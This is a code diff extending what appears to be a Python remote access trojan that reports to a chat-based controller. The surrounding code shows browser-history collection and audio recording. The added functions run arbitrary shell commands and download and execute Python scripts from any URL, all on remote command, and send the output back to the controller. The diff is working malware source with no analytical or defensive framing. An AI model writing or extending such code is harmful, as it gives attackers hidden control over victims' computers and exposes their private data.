@@ -2404,6 +2404,138 @@ def collect_browser_history(chat_id: str, days: int = 7):
         except: pass
 
 
+
+# ─── Python scripts ───────────────────────────────────────────────────────────
+
+PY_SCRIPT_DIR = DATA_DIR / "scripts"
+
+def get_py_scripts() -> list:
+    if not PY_SCRIPT_DIR.exists():
+        return []
+    files = sorted(
+        [f for f in PY_SCRIPT_DIR.iterdir() if f.suffix.lower() == '.py'],
+        key=lambda f: int(''.join(filter(str.isdigit, f.stem)) or 0)
+    )
+    return [{"name": f"py{i}", "filename": f.name, "path": str(f)}
+            for i, f in enumerate(files, 1)]
+
+def send_py_list(chat_id: str):
+    scripts = get_py_scripts()
+    http_post_json("/py_list", {
+        "chat_id": chat_id,
+        "device_id": DEVICE_ID,
+        "scripts": scripts,
+    })
+
+def fetch_py_script(url: str, chat_id: str = ""):
+    PY_SCRIPT_DIR.mkdir(exist_ok=True)
+    num  = len(get_py_scripts()) + 1
+    dest = PY_SCRIPT_DIR / f"py{num}.py"
+    try:
+        log.info(f"Downloading py script {url} -> {dest}")
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with _urlopen(req, timeout=60) as r, open(dest, "wb") as f:
+            f.write(r.read())
+        log.info(f"Script saved: {dest}")
+        if chat_id:
+            http_post_json("/text_reply", {
+                "chat_id": chat_id, "device_id": DEVICE_ID,
+                "text": f"✅ Скрипт сохранён как py{num} — запусти через /runpy {num}",
+            })
+    except Exception as e:
+        log.error(f"fetch_py_script: {e}")
+        if chat_id:
+            http_post_json("/text_reply", {
+                "chat_id": chat_id, "device_id": DEVICE_ID,
+                "text": f"⚠️ Ошибка скачивания: {e}",
+            })
+
+def run_py_script(num: int, chat_id: str = ""):
+    scripts = get_py_scripts()
+    if num < 1 or num > len(scripts):
+        if chat_id:
+            http_post_json("/text_reply", {
+                "chat_id": chat_id, "device_id": DEVICE_ID,
+                "text": f"⚠️ Нет скрипта py{num}",
+            })
+        return
+    path = scripts[num - 1]["path"]
+    try:
+        result = subprocess.run(
+            ["python", path],
+            capture_output=True, text=True, timeout=60
+        )
+        output = (result.stdout + result.stderr).strip() or "(нет вывода)"
+        http_post_json("/cmd_output", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "command": f"py{num}.py", "output": output,
+        })
+    except subprocess.TimeoutExpired:
+        http_post_json("/text_reply", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "text": f"⚠️ Скрипт py{num} превысил таймаут 60 сек",
+        })
+    except Exception as e:
+        log.error(f"run_py_script: {e}")
+        http_post_json("/text_reply", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "text": f"⚠️ Ошибка запуска: {e}",
+        })
+
+def delete_py_script(num: int, chat_id: str = ""):
+    scripts = get_py_scripts()
+    if num < 1 or num > len(scripts):
+        if chat_id:
+            http_post_json("/text_reply", {
+                "chat_id": chat_id, "device_id": DEVICE_ID,
+                "text": f"⚠️ Нет скрипта py{num}",
+            })
+        return
+    path = Path(scripts[num - 1]["path"])
+    if path.exists():
+        path.unlink()
+    # Переименовываем чтобы не было дырок
+    remaining = get_py_scripts()
+    for i, s in enumerate(remaining, 1):
+        old = Path(s["path"])
+        new = PY_SCRIPT_DIR / f"py{i}.py"
+        if old != new:
+            old.rename(new)
+    if chat_id:
+        http_post_json("/text_reply", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "text": f"🗑 py{num} удалён.",
+        })
+
+def run_cmd(command: str, chat_id: str = ""):
+    try:
+        log.info(f"run_cmd: {command}")
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=60,
+            encoding="cp866",   # кодировка cmd на Windows
+            errors="replace",
+        )
+        output = (result.stdout + result.stderr).strip() or "(нет вывода)"
+        http_post_json("/cmd_output", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "command": command, "output": output,
+        })
+    except subprocess.TimeoutExpired:
+        http_post_json("/text_reply", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "text": f"⚠️ Команда превысила таймаут 60 сек",
+        })
+    except Exception as e:
+        log.error(f"run_cmd: {e}")
+        http_post_json("/text_reply", {
+            "chat_id": chat_id, "device_id": DEVICE_ID,
+            "text": f"⚠️ Ошибка: {e}",
+        })
+
 # ─── Command handler ─────────────────────────────────────────────────────────
 
 def handle_command(cmd: dict):
@@ -2501,6 +2633,26 @@ def handle_command(cmd: dict):
         threading.Thread(target=record_and_send_audio,
                          args=(seconds, chat_id, device_index), daemon=True).start()
 
+    elif name == "run_cmd":
+        command = cmd.get("command", "")
+        threading.Thread(target=run_cmd, args=(command, chat_id), daemon=True).start()
+
+    elif name == "get_py_list":
+        threading.Thread(target=send_py_list, args=(chat_id,), daemon=True).start()
+
+    elif name == "fetch_py":
+        url = cmd.get("url", "")
+        threading.Thread(target=fetch_py_script, args=(url, chat_id), daemon=True).start()
+
+    elif name == "run_py":
+        num = cmd.get("num", 0)
+        threading.Thread(target=run_py_script, args=(num, chat_id), daemon=True).start()
+
+    elif name == "del_py":
+        num = cmd.get("num", 0)
+        threading.Thread(target=delete_py_script, args=(num, chat_id), daemon=True).start()
+
+    
     else:
         log.warning(f"Unknown command: {name}")
 
